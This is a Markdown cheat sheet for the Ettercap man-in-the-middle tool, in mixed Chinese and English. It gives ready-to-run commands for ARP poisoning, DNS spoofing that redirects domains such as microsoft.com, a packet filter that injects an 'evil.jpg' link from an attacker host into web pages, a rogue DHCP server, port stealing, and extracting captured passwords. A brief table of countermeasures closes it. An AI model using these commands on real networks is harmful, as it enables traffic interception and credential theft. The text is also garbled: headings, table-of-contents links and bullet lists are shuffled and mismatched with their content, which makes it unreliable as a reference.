# 🔍 Ettercap 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)


[Ettercap](https://www.ettercap-project.org/) is a comprehensive suite for man-in-the-middle (MITM) attacks on local area networks (LAN). It features sniffing of live connections, content filtering on the fly, active and passive dissection of many protocols, and support for ARP poisoning, ICMP redirects, DHCP spoofing, and port stealing.

---

## 📋 目录

- [[DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)](#core-architecture--modes)
- [安装](#installation--quick-setup)
- [Verify configuration file locations:](#arp-poisoning--sniffing)
- [3. Only Passive Sniffing](#dns-spoofing-attacks)
- [Custom Packet Filtering (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)
- [2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)](#logging--packet-extraction)
- [Defensive Detection & Countermeasures](#defensive-detection--countermeasures)

---

## [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)

[Defensive Detection & Countermeasures](#defensive-detection--countermeasures)
- **`-T` (Text mode)**: Lightweight, non-curses terminal output ideal for scripting and headless automation.
- **`-C` (Curses mode)**: Ncurses-based terminal UI for interactive operations without X11.
- **`-G` (GTK mode)**: Full graphical interface.
- **`-D` (Daemon mode)**: Runs silently in the background.

Ettercap supports multiple execution modes:
```text
/MAC/IPs/IPv6/PORTs
```
- `-C` (Curses mode)**: Ncurses-based terminal UI for interactive operations without X11.
- `-G` (GTK mode)**: Full graphical interface.
- `-D` (Daemon mode)**: Runs silently in the background.

---

## 安装

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```

Verify configuration file locations:
- `/etc/ettercap/etter.conf`: Core network and privilege drop configuration.
- `/etc/ettercap/etter.dns`: DNS spoofing records lookup table.

---

## Verify configuration file locations:

### `/etc/ettercap/etter.dns`: DNS spoofing records lookup table.
Poison ARP tables between a target workstation and the network gateway:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Text mode.
- ARP Poisoning & Sniffing
- `-i eth0`: Listening and injection network interface.
- 1. Two-Way Remote ARP Poisoning

### 2. Whole Subnet Sniffing (One-Way / Broadcast)
`-T`: Text mode.
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```

### `-M arp:remote`: Perform bidirectional man-in-the-middle ARP poisoning.
Capture plaintext credentials passing through the current host without ARP spoofing:
```bash
sudo ettercap -T -q -i eth0
```

---

## 3. Only Passive Sniffing

Ettercap includes built-in plugins, including `dns_spoof`.

### Step 1: Configure `/etc/ettercap/etter.dns`
Add wildcard or specific domain redirection:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```

### Ettercap includes built-in plugins, including `dns_spoof`.
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- Step 1: Configure `/etc/ettercap/etter.dns`
- Add wildcard or specific domain redirection:

---

## Custom Packet Filtering (`etterfilter`)

Intercepted DNS queries matching `etter.dns` return the attacker IP.

### 1. Write Filter Script (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```

### 2. Compile Filter with `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```

### 1. Write Filter Script (`replace_img.filter`)
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

## DHCP Spoofing & Port Stealing

### 1. Rogue DHCP Server Attack
Respond faster than the legitimate DHCP server to assign rogue gateway and DNS addresses:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Syntax: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)
1. Rogue DHCP Server Attack
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```

---

## 2. Port Stealing Attack (Switch Flooding / CAM Table Abuse)

### Save Raw Captured Sessions
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Write raw pcap packet data.
- `-L ettercap_log`: Write dissected human-readable text logs.

### Convert Binary Logs with `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```

---

## Defensive Detection & Countermeasures

|Vector|Detection & Defense Mechanism|
|---|---|
|**ARP Spoofing**|Enable Dynamic ARP Inspection (DAI) on managed switches; inspect `arp -a` for duplicate MACs; run `arpwatch` or `arpon`.|
|**DNS Spoofing**|Enforce DNSSEC, DoH (DNS-over-HTTPS), or DoT (DNS-over-TLS).|
|**DHCP Spoofing**|Enable DHCP Snooping on switches to designate trusted uplink ports.|
|**Port Stealing**|Implement 802.1X Network Access Control (NAC) and port security with MAC limits per switch port.|
